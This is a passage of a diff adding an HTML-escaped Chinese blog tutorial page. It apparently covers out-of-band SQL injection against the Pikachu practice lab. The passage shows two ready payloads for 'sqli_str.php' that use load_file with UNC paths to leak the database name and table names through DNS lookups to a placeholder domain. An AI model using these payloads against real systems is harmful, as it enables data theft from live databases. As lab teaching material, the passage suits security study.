+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;或者（推荐）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sqli_str.php?name=abc&amp;#39; and if((select load_file(concat(&amp;#39;\\\\&amp;#39;,(database()),&amp;#39;.域名\\xxx&amp;#39;))),1,0) --+&amp;amp;submit=submit
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;background-color:rgba(255, 255, 255, 0);&#34;&gt;示例（查看当前表名）：&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sqli_str.php?name=abc&amp;#39; and if((select load_file(concat(&amp;#39;\\\\&amp;#39;,(select table_name from information_schema.tables where table_schema=0x70696b61636875 limit 0,1),&amp;#39;.域名\\xx1&amp;#39;))),1,0) --+&amp;amp;submit=submit
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;打开&lt;a class=&#34;link&#34; href=&#34;https://makabaka11.github.io/blog-files/dnslog.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
